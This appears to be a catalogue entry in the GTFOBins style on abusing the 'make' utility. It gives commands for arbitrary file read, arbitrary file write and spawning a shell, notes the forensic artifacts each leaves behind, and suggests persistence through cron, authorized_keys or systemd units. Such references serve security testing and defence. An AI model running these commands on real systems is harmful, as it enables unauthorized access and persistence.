---
name: make
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: make -s --eval='$(file >/path/to/output-file,DATA)' .
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: make --eval='$(shell /bin/sh 1>&0)' .
references:
- https://gtfobins.github.io/gtfobins/make/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
